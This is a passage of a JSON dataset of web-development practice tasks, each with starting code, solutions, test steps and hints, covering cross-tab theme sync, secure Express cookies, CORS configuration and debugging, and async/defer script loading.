localStorage.getItem(THEME_KEY);\n        if (storedTheme) {\n            applyTheme(storedTheme);\n        } else {\n            // Default theme if nothing in storage\n            applyTheme('light');\n            localStorage.setItem(THEME_KEY, 'light');\n        }\n\n    </script>\n</body>\n</html>\n",
          "solutionCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Theme Sync Demo</title>\n    <style>\n        body {\n            font-family: sans-serif;\n            transition: background-color 0.3s, color 0.3s;\n        }\n        body.light-theme {\n            background-color: #f0f0f0;\n            color: #333;\n        }\n        body.dark-theme {\n            background-color: #333;\n            color: #f0f0f0;\n        }\n    </style>\n</head>\n<body class=\"light-theme\">\n    <h1>Cross-Tab Theme Synchronizer</h1>\n    <p>Current Theme: <span id=\"currentThemeDisplay\">Light</span></p>\n    <button id=\"toggleThemeBtn\">Toggle Theme</button>\n\n    <script>\n        const THEME_KEY = 'appTheme';\n        const body = document.body;\n        const toggleBtn = document.getElementById('toggleThemeBtn');\n        const themeDisplay = document.getElementById('currentThemeDisplay');\n\n        function applyTheme(theme) {\n            body.className = ''; // Clear existing classes\n            if (theme === 'dark') {\n                body.classList.add('dark-theme');\n                themeDisplay.textContent = 'Dark';\n            } else {\n                body.classList.add('light-theme');\n                themeDisplay.textContent = 'Light';\n            }\n        }\n\n        // Initial theme load\n        const storedTheme = localStorage.getItem(THEME_KEY);\n        if (storedTheme) {\n            applyTheme(storedTheme);\n        } else {\n            // Default theme if nothing in storage\n            applyTheme('light');\n            localStorage.setItem(THEME_KEY, 'light');\n        }\n\n        // Toggle theme logic\n        toggleBtn.addEventListener('click', () => {\n            const currentTheme = localStorage.getItem(THEME_KEY);\n            const newTheme = currentTheme === 'dark' ? 'light' : 'dark';\n            localStorage.setItem(THEME_KEY, newTheme); // This triggers the 'storage' event in other tabs\n            applyTheme(newTheme); // Update current tab directly\n        });\n\n        // Storage event listener for cross-tab sync\n        window.addEventListener('storage', (event) => {\n            if (event.key === THEME_KEY && event.storageArea === localStorage) {\n                const newTheme = event.newValue;\n                if (newTheme) {\n                    applyTheme(newTheme);\n                    console.log(`Theme updated by another tab: ${newTheme}`);\n                } else {\n                    // Handle case where theme might be cleared (e.g., localStorage.clear() in another tab)\n                    applyTheme('light'); // Revert to default\n                    console.log('Theme cleared by another tab, reverting to default.');\n                }\n            }\n        });\n    </script>\n</body>\n</html>\n",
          "testCases": [
            "1. Open the HTML file in one tab, then duplicate it to a second tab.\n2. In the first tab, click 'Toggle Theme'. Verify the theme changes in *both* tabs.\n3. In the second tab, click 'Toggle Theme'. Verify the theme changes in *both* tabs.\n4. Close all tabs, then open a new tab. Verify the last set theme is loaded initially.\n5. Manually clear localStorage in one tab's console (`localStorage.clear()`). Observe how other tabs react (they should revert to default or handle the null value).",
            "Test with multiple tabs (>2) open to ensure broadcast functionality."
          ],
          "hints": [
            "Remember that the `storage` event only fires for changes initiated by *other* windows/tabs.",
            "The tab making the change needs to update its own UI explicitly.",
            "Use `event.key` and `event.newValue` from the `storage` event object.",
            "Ensure `localStorage.setItem()` is used to trigger the event."
          ],
          "tags": [
            "web-storage",
            "event-listener",
            "frontend",
            "dom-manipulation",
            "synchronization",
            "cross-browser"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "web_storage_basics",
            "event_listeners",
            "dom_manipulation"
          ],
          "complexity": 6,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "local_storage",
            "event_bubbling",
            "state_management"
          ]
        },
        {
          "id": "task_secure_cookie_implementation",
          "title": "Implement Secure Cookie Setup (Node.js/Express)",
          "description": "\nDesign and implement a basic Node.js (Express) server that sets an authentication cookie upon a successful 'login' (a mock `/login` endpoint). The cookie should be configured with best practices for security.\n\n**Requirements:**\n1.  Create a simple Express application.\n2.  Define a `/login` endpoint that responds to `POST` requests.\n3.  When a `POST` request is received at `/login` (no actual authentication logic needed, just simulate success), set a cookie named `authToken`.\n4.  The `authToken` cookie must be configured with the `HttpOnly`, `Secure`, and `SameSite=Lax` attributes.\n5.  Include a `maxAge` for the cookie (e.g., 1 hour).\n6.  Add a simple `/dashboard` endpoint that checks for the `authToken` cookie. If present, it should respond with 'Welcome to the dashboard!'; otherwise, 'Unauthorized'.\n\n**Note**: You will need to install `express` and `cookie-parser` (`npm install express cookie-parser`).\n",
          "difficulty": "medium",
          "startingCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\nconst PORT = 3000;\n\napp.use(express.json()); // To parse JSON request bodies\napp.use(cookieParser()); // To parse incoming cookies\n\napp.post('/login', (req, res) => {\n  // TODO: Simulate successful login\n  // TODO: Set the authToken cookie with HttpOnly, Secure, SameSite=Lax, and maxAge\n  // res.cookie('authToken', 'your_jwt_token', { /* options */ });\n  res.send('Login successful, cookie set!');\n});\n\napp.get('/dashboard', (req, res) => {\n  // TODO: Check if the authToken cookie is present\n  // if (req.cookies.authToken) {\n  //   res.send('Welcome to the dashboard!');\n  // } else {\n  //   res.status(401).send('Unauthorized');\n  // }\n  res.send('Dashboard endpoint placeholder.');\n});\n\napp.listen(PORT, () => {\n  console.log(`Server running on http://localhost:${PORT}`);\n});\n",
          "solutionCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\nconst PORT = 3000;\n\napp.use(express.json()); // To parse JSON request bodies\napp.use(cookieParser()); // To parse incoming cookies\n\n// Mock login endpoint\napp.post('/login', (req, res) => {\n  // In a real app, you'd validate credentials here\n  const mockAuthToken = 'mock-secure-jwt-12345';\n\n  // Set the authToken cookie with secure flags\n  res.cookie('authToken', mockAuthToken, {\n    httpOnly: true, // Prevents client-side JavaScript access\n    secure: true,   // Only send over HTTPS (important for production)\n    sameSite: 'Lax', // Protects against most CSRF attacks\n    maxAge: 3600000 // Cookie expires in 1 hour (in milliseconds)\n  });\n\n  res.status(200).json({ message: 'Login successful, authentication cookie set!' });\n});\n\n// Dashboard endpoint requiring authentication\napp.get('/dashboard', (req, res) => {\n  if (req.cookies.authToken) {\n    res.status(200).send('Welcome to the protected dashboard! Your auth token is present (server-side).');\n  } else {\n    res.status(401).send('Unauthorized: No authentication token found.');\n  }\n});\n\n// Client-side access test (should NOT show HttpOnly cookie)\napp.get('/client-test', (req, res) => {\n  res.send(`\n    <!DOCTYPE html>\n    <html>\n    <body>\n        <h1>Client-Side Cookie Access Test</h1>\n        <p>Check console for document.cookie:</p>\n        <script>\n            console.log('document.cookie:', document.cookie);\n            // This should NOT show the 'authToken' if HttpOnly is true\n            document.body.innerHTML += '<p>document.cookie result in console.</p>';\n        </script>\n    </body>\n    </html>\n  `);\n});\n\napp.listen(PORT, () => {\n  console.log(`Server running on http://localhost:${PORT}`);\n  console.log('Try: POST http://localhost:3000/login (e.g., with empty JSON body)');\n  console.log('Then: GET http://localhost:3000/dashboard');\n  console.log('Then: GET http://localhost:3000/client-test');\n});\n",
          "testCases": [
            "1. Start the server.\n2. Use a tool like Postman, curl, or a simple HTML form/fetch request to send a `POST` request to `http://localhost:3000/login`.\n3. Verify in your browser's developer tools (Application -> Cookies) that the `authToken` cookie is set for `localhost:3000` with `HttpOnly`, `Secure` (if using HTTPS, otherwise this flag will be ignored by browser), and `SameSite=Lax`.\n4. Send a `GET` request to `http://localhost:3000/dashboard`. Verify you receive 'Welcome to the dashboard!'.\n5. Clear your browser cookies for `localhost`.\n6. Send a `GET` request to `http://localhost:3000/dashboard` again. Verify you receive 'Unauthorized'.\n7. Navigate to `http://localhost:3000/client-test` and check the browser console. Verify that `document.cookie` does *not* show the `authToken` (demonstrates `HttpOnly`).",
            "Test that the cookie expires after `maxAge` (requires waiting or changing system time)."
          ],
          "hints": [
            "The `res.cookie()` method in Express is used to set cookies.",
            "Options for `res.cookie()` are provided as an object.",
            "Remember that the `Secure` flag only works when accessed over HTTPS. For local development, browsers might sometimes allow it over HTTP for `localhost`, but it's best practice to test with HTTPS in mind.",
            "`req.cookies` object (provided by `cookie-parser`) is where you'll find parsed incoming cookies."
          ],
          "tags": [
            "web-security",
            "cookies",
            "backend",
            "node",
            "express",
            "authentication"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "node_basics",
            "express_basics",
            "http_basics"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "authentication",
            "session_management",
            "server_side_rendering"
          ]
        },
        {
          "id": "task_cors_implementation",
          "title": "Configure Basic CORS for a Node.js API",
          "description": "\nImplement a Node.js (Express) server and a simple HTML client to demonstrate CORS. The client should attempt to fetch data from the server across different origins.\n\n**Requirements for Server (Node.js/Express):**\n1.  Create an Express server listening on `http://localhost:4000`.\n2.  Implement a `GET /api/message` endpoint that returns a JSON message.\n3.  Configure CORS headers on this endpoint to allow requests *only* from `http://localhost:3000`.\n4.  Allow `GET` and `POST` methods, and `Content-Type` and `Authorization` headers.\n5.  Handle preflight `OPTIONS` requests appropriately.\n\n**Requirements for Client (HTML/JavaScript):**\n1.  Create a simple HTML page with an `index.html` file that will run on `http://localhost:3000`.\n2.  Use `fetch` to make a `GET` request to `http://localhost:4000/api/message`.\n3.  Display the fetched message on the page.\n4.  Add a button to make a `POST` request to the same endpoint with a custom `X-Custom-Header` and `Content-Type: application/json`.\n5.  Log any CORS errors to the console if configuration is incorrect (for debugging purposes).\n\n**Testing:**\n-   First, run both server and client with incorrect or missing CORS settings to observe the CORS error.\n-   Then, apply the correct CORS settings on the server and verify both GET and POST requests succeed.\n",
          "difficulty": "medium",
          "startingCode": "```javascript\n// server.js (Node.js Express)\nconst express = require('express');\nconst app = express();\nconst PORT = 4000;\n\napp.use(express.json()); // For parsing application/json\n\n// TODO: Implement CORS middleware here\n/*\napp.use((req, res, next) => {\n  // Set CORS headers\n  // res.header('Access-Control-Allow-Origin', '...');\n  // res.header('Access-Control-Allow-Methods', '...');\n  // res.header('Access-Control-Allow-Headers', '...');\n  // Handle OPTIONS preflight\n  // if (req.method === 'OPTIONS') { ... }\n  next();\n});\n*/\n\napp.get('/api/message', (req, res) => {\n  res.json({ message: 'Hello from API!' });\n});\n\napp.post('/api/message', (req, res) => {\n  console.log('POST request body:', req.body);\n  res.json({ message: 'POST request received!', data: req.body });\n});\n\napp.listen(PORT, () => {\n  console.log(`Server running on http://localhost:${PORT}`);\n});\n```\n\n```html\n<!-- index.html (client-side) -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>CORS Client</title>\n</head>\n<body>\n    <h1>CORS Client Demo</h1>\n    <p>Message from API: <span id=\"apiMessage\">Loading...</span></p>\n    <button id=\"fetchGetBtn\">Fetch GET Data</button>\n    <button id=\"fetchPostBtn\">Fetch POST Data</button>\n\n    <script>\n        const apiMessageSpan = document.getElementById('apiMessage');\n        const fetchGetBtn = document.getElementById('fetchGetBtn');\n        const fetchPostBtn = document.getElementById('fetchPostBtn');\n        const API_URL = 'http://localhost:4000/api/message';\n\n        async function fetchGetData() {\n            try {\n                const response = await fetch(API_URL);\n                const data = await response.json();\n                apiMessageSpan.textContent = data.message;\n                console.log('GET success:', data);\n            } catch (error) {\n                console.error('GET Fetch error:', error);\n                apiMessageSpan.textContent = 'Error fetching GET data.';\n            }\n        }\n\n        async function fetchPostData() {\n            try {\n                const response = await fetch(API_URL, {\n                    method: 'POST',\n                    headers: {\n                        'Content-Type': 'application/json',\n                        'Authorization': 'Bearer abcdef123',\n                        'X-Custom-Header': 'my-value'\n                    },\n                    body: JSON.stringify({ key: 'value', client: 'frontend-app' })\n                });\n                const data = await response.json();\n                console.log('POST success:', data);\n                alert('POST response: ' + data.message);\n            } catch (error) {\n                console.error('POST Fetch error:', error);\n                alert('Error sending POST data. Check console for CORS errors.');\n            }\n        }\n\n        fetchGetBtn.addEventListener('click', fetchGetData);\n        fetchPostBtn.addEventListener('click', fetchPostData);\n\n        // Initial fetch\n        fetchGetData();\n    </script>\n</body>\n</html>\n```\n",
          "solutionCode": "```javascript\n// server.js (Node.js Express)\nconst express = require('express');\nconst app = express();\nconst PORT = 4000;\n\napp.use(express.json()); // For parsing application/json\n\n// CORS middleware\napp.use((req, res, next) => {\n  // 1. Allow requests from http://localhost:3000\n  res.header('Access-Control-Allow-Origin', 'http://localhost:3000');\n  \n  // 2. Allow specific methods (GET, POST, and OPTIONS for preflight)\n  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');\n  \n  // 3. Allow specific headers (Content-Type, Authorization, X-Custom-Header)\n  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Custom-Header');\n  \n  // 4. Handle preflight OPTIONS requests\n  // When the browser sends an OPTIONS request for a non-simple request, \n  // it only needs the headers, no actual content.\n  if (req.method === 'OPTIONS') {\n    return res.sendStatus(204); // Send 204 No Content status for successful preflight\n  }\n  \n  next();\n});\n\napp.get('/api/message', (req, res) => {\n  res.json({ message: 'Hello from API! (GET request)' });\n});\n\napp.post('/api/message', (req, res) => {\n  console.log('POST request body received:', req.body);\n  res.json({ message: 'POST request received successfully!', data: req.body });\n});\n\napp.listen(PORT, () => {\n  console.log(`Server running on http://localhost:${PORT}`);\n});\n```\n\n```html\n<!-- index.html (client-side) -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>CORS Client</title>\n</head>\n<body>\n    <h1>CORS Client Demo</h1>\n    <p>Message from API: <span id=\"apiMessage\">Loading...</span></p>\n    <button id=\"fetchGetBtn\">Fetch GET Data</button>\n    <button id=\"fetchPostBtn\">Fetch POST Data</button>\n\n    <script>\n        const apiMessageSpan = document.getElementById('apiMessage');\n        const fetchGetBtn = document.getElementById('fetchGetBtn');\n        const fetchPostBtn = document.getElementById('fetchPostBtn');\n        const API_URL = 'http://localhost:4000/api/message';\n\n        async function fetchGetData() {\n            try {\n                const response = await fetch(API_URL);\n                if (!response.ok) {\n                    throw new Error(`HTTP error! status: ${response.status}`);\n                }\n                const data = await response.json();\n                apiMessageSpan.textContent = data.message;\n                console.log('GET success:', data);\n            } catch (error) {\n                console.error('GET Fetch error:', error);\n                apiMessageSpan.textContent = 'Error fetching GET data. Check console.';\n            }\n        }\n\n        async function fetchPostData() {\n            try {\n                const response = await fetch(API_URL, {\n                    method: 'POST',\n                    headers: {\n                        'Content-Type': 'application/json',\n                        'Authorization': 'Bearer abcdef123',\n                        'X-Custom-Header': 'my-value' // This makes it a non-simple request\n                    },\n                    body: JSON.stringify({ key: 'value', client: 'frontend-app' })\n                });\n                if (!response.ok) {\n                    throw new Error(`HTTP error! status: ${response.status}`);\n                }\n                const data = await response.json();\n                console.log('POST success:', data);\n                alert('POST response: ' + data.message);\n            } catch (error) {\n                console.error('POST Fetch error:', error);\n                alert('Error sending POST data. Check console for CORS errors.');\n            }\n        }\n\n        fetchGetBtn.addEventListener('click', fetchGetData);\n        fetchPostBtn.addEventListener('click', fetchPostData);\n\n        // Initial fetch on page load\n        fetchGetData();\n    </script>\n</body>\n</html>\n```\n",
          "testCases": [
            "1. Start the Node.js server (`node server.js`).\n2. Serve the `index.html` file using a simple HTTP server (e.g., `npx serve .` if you have `serve` installed, or open directly if your browser allows it, but `localhost:3000` setup is better). Make sure it runs on `http://localhost:3000`.\n3. Open `http://localhost:3000/index.html` in your browser.\n4. Observe the console. Initially, the `GET` request should succeed and display the message.\n5. Click 'Fetch POST Data'. Observe the console. The `POST` request should succeed, and you should see the `POST success` log and an alert with the response.",
            "Modify `Access-Control-Allow-Origin` on the server to `http://localhost:3001` (a different port) and test again. Both requests should fail with CORS errors.\n",
            "Remove `Authorization` from `Access-Control-Allow-Headers` on the server and test the POST request. It should fail with a CORS error related to the missing header.",
            "Remove `OPTIONS` from `Access-Control-Allow-Methods` on the server and test the POST request. It should fail with a CORS error related to method not allowed for preflight."
          ],
          "hints": [
            "Remember that the `Access-Control-Allow-Origin` header must exactly match the origin of your client-side application (including protocol and port).",
            "Non-simple requests (like `POST` with `application/json` or custom headers) trigger an `OPTIONS` preflight request. Your server must respond correctly to this `OPTIONS` request and include the necessary `Access-Control-Allow-Methods` and `Access-Control-Allow-Headers`.",
            "For `OPTIONS` requests, it's common to respond with `res.sendStatus(204)` after setting the headers."
          ],
          "tags": [
            "web-security",
            "cors",
            "backend",
            "frontend",
            "http-headers",
            "networking",
            "express",
            "fetch-api"
          ],
          "timeEstimate": 90,
          "prerequisites": [
            "http_basics",
            "node_basics",
            "express_basics",
            "fetch_api_basics"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "same_origin_policy",
            "preflight_requests",
            "api_integration"
          ]
        },
        {
          "id": "task_debug_cors",
          "title": "Debugging a CORS Error Scenario",
          "description": "\nYou are given a React frontend app and a simple Node.js backend. The frontend is trying to make a `PUT` request to update user data, but it's constantly failing with a CORS error.\n\n**Frontend (`App.js` simplified):**\n```javascript\nimport React from 'react';\n\nfunction App() {\n  const updateUserData = async () => {\n    const userData = { name: 'John Doe', email: 'john.doe@example.com' };\n    try {\n      const response = await fetch('http://localhost:5000/api/user/123',\n        {\n          method: 'PUT',\n          headers: {\n            'Content-Type': 'application/json',\n            'Authorization': 'Bearer some_jwt_token',\n            'X-Request-ID': 'unique-id-123'\n          },\n          body: JSON.stringify(userData)\n        }\n      );\n      const data = await response.json();\n      console.log('Update successful:', data);\n    } catch (error) {\n      console.error('Error updating user:', error);\n    }\n  };\n\n  return (\n    <div>\n      <h1>User Management</h1>\n      <button onClick={updateUserData}>Update User</button>\n    </div>\n  );\n}\n\nexport default App;\n```\n\n**Backend (`server.js` simplified):**\n```javascript\nconst express = require('express');\nconst app = express();\nconst PORT = 5000;\n\napp.use(express.json());\n\n// Initial (incomplete) CORS configuration\napp.use((req, res, next) => {\n  res.header('Access-Control-Allow-Origin', 'http://localhost:3000');\n  res.header('Access-Control-Allow-Methods', 'GET, POST');\n  res.header('Access-Control-Allow-Headers', 'Content-Type');\n  next();\n});\n\napp.put('/api/user/:id', (req, res) => {\n  console.log(`Updating user ${req.params.id} with data:`, req.body);\n  res.json({ message: `User ${req.params.id} updated successfully.`, updatedData: req.body });\n});\n\napp.listen(PORT, () => {\n  console.log(`Backend running on http://localhost:${PORT}`);\n});\n```\n\n**Task:** Identify the specific reasons for the CORS error based on the provided code, and then modify the `server.js` file's CORS configuration to resolve the issue, allowing the `PUT` request to succeed. Explain your changes.\n",
          "difficulty": "hard",
          "startingCode": "```javascript\n// server.js (Node.js Express)\nconst express = require('express');\nconst app = express();\nconst PORT = 5000;\n\napp.use(express.json());\n\n// Initial (incomplete) CORS configuration\napp.use((req, res, next) => {\n  res.header('Access-Control-Allow-Origin', 'http://localhost:3000');\n  res.header('Access-Control-Allow-Methods', 'GET, POST');\n  res.header('Access-Control-Allow-Headers', 'Content-Type');\n  next();\n});\n\napp.put('/api/user/:id', (req, res) => {\n  console.log(`Updating user ${req.params.id} with data:`, req.body);\n  res.json({ message: `User ${req.params.id} updated successfully.`, updatedData: req.body });\n});\n\napp.listen(PORT, () => {\n  console.log(`Backend running on http://localhost:${PORT}`);\n});\n```",
          "solutionCode": "```javascript\n// server.js (Node.js Express) - RESOLVED\nconst express = require('express');\nconst app = express();\nconst PORT = 5000;\n\napp.use(express.json());\n\n// Corrected CORS configuration\napp.use((req, res, next) => {\n  res.header('Access-Control-Allow-Origin', 'http://localhost:3000');\n  \n  // FIX 1: Add 'PUT' method and 'OPTIONS' for preflight requests\n  // The frontend uses PUT, and PUT is a non-simple request, requiring an OPTIONS preflight.\n  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS'); \n  \n  // FIX 2: Add 'Authorization' and 'X-Request-ID' to allowed headers\n  // The frontend sends these custom headers, which must be explicitly allowed.\n  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Request-ID');\n  \n  // FIX 3: Handle OPTIONS preflight requests\n  // Browsers send an OPTIONS request before non-simple requests to check CORS permissions.\n  // The server must respond with 204 No Content and the correct CORS headers.\n  if (req.method === 'OPTIONS') {\n    return res.sendStatus(204); \n  }\n  \n  next();\n});\n\napp.put('/api/user/:id', (req, res) => {\n  console.log(`Updating user ${req.params.id} with data:`, req.body);\n  res.json({ message: `User ${req.params.id} updated successfully.`, updatedData: req.body });\n});\n\napp.listen(PORT, () => {\n  console.log(`Backend running on http://localhost:${PORT}`);\n});\n```\n\n**Explanation of Changes:**\n\n1.  **`Access-Control-Allow-Methods`**: The original configuration only allowed `GET, POST`. The frontend is attempting a `PUT` request. `PUT` is a non-simple HTTP method and therefore requires explicit permission. Additionally, any non-simple request (which `PUT` is) will trigger an `OPTIONS` preflight request. The `OPTIONS` method must also be explicitly allowed in this header for the preflight to succeed.\n\n2.  **`Access-Control-Allow-Headers`**: The original configuration only allowed `Content-Type`. The frontend's `PUT` request includes two custom headers: `Authorization` and `X-Request-ID`. Any custom headers sent in a cross-origin request must be explicitly listed in the `Access-Control-Allow-Headers` response header. Otherwise, the browser will block the request.\n\n3.  **Preflight `OPTIONS` Request Handling**: While not strictly a 'header' fix, it's a critical part of CORS configuration for non-simple requests. The browser first sends an `OPTIONS` request. The server must respond to this `OPTIONS` request with a `204 No Content` status and include all the relevant `Access-Control-*` headers. The `if (req.method === 'OPTIONS') { return res.sendStatus(204); }` block ensures that the preflight request is properly handled before the actual `PUT` request is sent.",
          "testCases": [
            "1. Start the Node.js backend with the *initial* code.\n2. Run the React frontend (e.g., `npm start`).\n3. Click the 'Update User' button. Observe the CORS error in the browser console, specifically noting messages about `PUT` method not allowed or specific headers not allowed.\n4. Replace the backend's CORS configuration with the *solution* code.\n5. Restart the Node.js backend.\n6. Click 'Update User' again in the React app. Verify that the request now succeeds, and you see 'Update successful:' in the browser console and 'Updating user...' in the backend console."
          ],
          "hints": [
            "Pay close attention to the HTTP method (`PUT`) and any non-standard or non-simple headers (`Authorization`, `X-Request-ID`) being sent by the frontend.",
            "Remember that `PUT` requests are considered 'non-simple' and trigger a preflight (`OPTIONS`) request.",
            "Ensure all methods and headers used by the frontend request are explicitly listed in the server's CORS configuration."
          ],
          "tags": [
            "web-security",
            "cors",
            "debugging",
            "backend",
            "frontend",
            "http-headers",
            "interview-challenge"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "cors_basics",
            "http_methods",
            "http_headers",
            "node_express_basics"
          ],
          "complexity": 9,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "relatedConcepts": [
            "preflight_requests",
            "fetch_api",
            "react_basics"
          ]
        },
        {
          "id": "task_optimize_script_loading",
          "title": "Optimize Script Loading for a Fictional E-commerce Page",
          "description": "\nYou are tasked with optimizing the loading performance of a simple e-commerce product page. The page has several JavaScript dependencies with different roles.\n\n**Given Scripts:**\n1.  `polyfill.js`: Contains polyfills for older browser compatibility. Must run very early.\n2.  `analytics.js`: For user tracking. Should not block rendering but needs to load quickly.\n3.  `product-gallery.js`: Initializes a dynamic image gallery. Requires the DOM to be fully loaded and interacts with specific elements.\n4.  `add-to-cart.js`: Handles adding items to the cart. Also requires DOM interaction and might depend on `product-gallery.js` being loaded, or at least run after the gallery elements exist.\n5.  `reviews-widget.js`: A third-party script for displaying product reviews. It's independent of your core app logic but might take some time to load.\n\n**Task:**\nCreate an `index.html` file and insert these scripts using the most appropriate loading strategies (`async`, `defer`, or regular) and placement (head or body) to achieve:\n\n1.  **Maximum perceived performance**: HTML content should display as quickly as possible.\n2.  **Correct functionality**: Scripts that rely on the DOM or other scripts execute at the right time.\n3.  **Minimal blocking**: Avoid blocking HTML parsing for non-critical scripts.\n\nProvide the `index.html` structure with the script tags and brief comments explaining your choices for each script.",
          "difficulty": "medium",
          "startingCode": "```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>E-commerce Product Page</title>\n    <!-- Assume some basic CSS here -->\n</head>\n<body>\n    <header>\n        <h1>Product Name</h1>\n    </header>\n    <main>\n        <section id=\"product-details\">\n            <div id=\"gallery\">\n                <!-- Image gallery elements -->\n            </div>\n            <p>Product description...</p>\n            <button id=\"add-to-cart-btn\">Add to Cart</button>\n        </section>\n        <section id=\"reviews\">\n            <h2>Customer Reviews</h2>\n            <div id=\"reviews-widget\">\n                <!-- Reviews content will be injected by JS -->\n            </div>\n        </section>\n    </main>\n    <footer>\n        <p>&copy; 2023 E-commerce Store</p>\n    </footer>\n\n    <!-- Script Tags - TO BE FILLED IN -->\n    <!-- polyfill.js -->\n    <!-- analytics.js -->\n    <!-- product-gallery.js -->\n    <!-- add-to-cart.js -->\n    <!-- reviews-widget.js -->\n\n</body>\n</html>\n```",
          "solutionCode": "```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>E-commerce Product Page</title>\n    <!-- Assume some basic CSS here -->\n\n    <!-- 1. polyfill.js: Must run very early to ensure compatibility for subsequent scripts. -->\n    <!-- Placed as a regular script in the head to ensure it executes before other scripts are parsed/executed. -->\n    <script src=\"polyfill.js\"></script>\n\n    <!-- 2. analytics.js: Independent, non-blocking, and doesn't affect DOM rendering. -->\n    <!-- 'async' allows it to download in parallel and execute as soon as ready, without blocking HTML. -->\n    <script async src=\"analytics.js\"></script>\n\n    <!-- 5. reviews-widget.js: Third-party, independent, no DOM dependency on initial load from *our* app. -->\n    <!-- 'async' is suitable as it runs when ready and doesn't block critical path. -->\n    <script async src=\"reviews-widget.js\"></script>\n\n</head>\n<body>\n    <header>\n        <h1>Product Name</h1>\n    </header>\n    <main>\n        <section id=\"product-details\">\n            <div id=\"gallery\">\n                <!-- Image gallery elements -->\n            </div>\n            <p>Product description...</p>\n            <button id=\"add-to-cart-btn\">Add to Cart</button>\n        </section>\n        <section id=\"reviews\">\n            <h2>Customer Reviews</h2>\n            <div id=\"reviews-widget\">\n                <!-- Reviews content will be injected by JS -->\n            </div>\n        </section>\n    </main>\n    <footer>\n        <p>&copy; 2023 E-commerce Store</p>\n    </footer>\n\n    <!-- 3. product-gallery.js: Requires DOM elements to be ready. -->\n    <!-- 'defer' ensures it downloads in parallel but executes only after HTML parsing is complete. -->\n    <script defer src=\"product-gallery.js\"></script>\n\n    <!-- 4. add-to-cart.js: Requires DOM elements (button) and potentially depends on other core JS. -->\n    <!-- 'defer' ensures DOM readiness and maintains execution order relative to other 'defer' scripts (like product-gallery.js). -->\n    <script defer src=\"add-to-cart.js\"></script>\n\n</body>\n</html>\n```\n\n**Explanation of Choices:**\n\n1.  **`polyfill.js` (Regular script in `<head>`)**: Polyfills are often required before any other JavaScript runs to ensure modern features are available for older browsers. Placing it as a regular script in the `<head>` ensures it's the first script parsed and executed, even though it's blocking. Its critical nature for subsequent scripts outweighs the minor blocking for what's typically a small file.\n\n2.  **`analytics.js` (`async` in `<head>`)**: Analytics scripts are generally non-critical for initial page rendering or user interaction. They can be downloaded in parallel with HTML parsing and executed as soon as they are ready, without blocking. `async` is perfect here as execution order isn't important relative to other scripts.\n\n3.  **`reviews-widget.js` (`async` in `<head>`)**: Similar to analytics, a third-party reviews widget is typically independent of the core application logic and can load asynchronously. Using `async` allows it to fetch and execute without delaying other critical processes.\n\n4.  **`product-gallery.js` (`defer` at `</body>` end)**: This script explicitly requires the DOM to be fully loaded (`#gallery` element). `defer` is ideal because it downloads in parallel with HTML parsing but waits to execute until the DOM is ready. Placing it before `add-to-cart.js` (if `add-to-cart.js` had a dependency on it) also benefits from `defer`'s guaranteed execution order.\n\n5.  **`add-to-cart.js` (`defer` at `</body>` end)**: This script also manipulates DOM elements (like `#add-to-cart-btn`) and is part of the core application functionality. `defer` ensures it runs after the DOM is ready and maintains its relative order with other `defer` scripts, which is crucial for application logic dependencies. Placing it at the end of the `<body>` also ensures that the HTML for these elements is parsed before the script attempts to interact with them.\n\nThis configuration prioritizes rendering HTML quickly by offloading most JavaScript downloads to the background, while ensuring critical polyfills run first and DOM-dependent scripts run only when the DOM is ready, maintaining a good balance of performance and correctness.",
          "testCases": [
            "1. Create dummy `*.js` files (e.g., `touch polyfill.js analytics.js product-gallery.js add-to-cart.js reviews-widget.js`).\n2. Add `console.log()` statements inside each dummy file to indicate when they 'execute'.\n3. Use `setTimeout` within `async` and `defer` scripts to simulate network/processing delays and observe how they print relative to each other and to 'DOMContentLoaded' event.\n4. Open the `index.html` file in a browser and check the console logs to confirm the expected order based on `async`, `defer`, and regular script behavior."
          ],
          "hints": [
            "Consider what each script *needs* to function (e.g., DOM elements, other scripts) and what its *impact* on initial page load is.",
            "Think about 'blocking' vs. 'non-blocking' and 'execution timing' relative to HTML parsing and `DOMContentLoaded`.",
            "`async` is for independent scripts that can run at any time after download.",
            "`defer` is for scripts that depend on the DOM and need to run after parsing, in order.",
            "Regular scripts (`<script src>`) block parsing."
          ],
          "tags": [
            "performance",
            "script-loading",
            "html",
            "frontend-optimization",
            "best-practices",
            "browser-internals"
          ],
          "timeEstimate": 75,
          "prerequisites": [
            "html_structure",
            "javascript_basics",
            "browser_rendering_process"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "web_performance",
            "fcp",
            "dom_content_loaded",
            "script_execution"
          ]
        }
      ]
    }
  },
  {
    "id": "6500d195-cf03-478b-8850-3e7d7d7e4ac4",
    "startLine": 11100,
    "endLine": 11199,
    "processedDate": "2025-06-17T12:01:06.138Z",
    "content": {
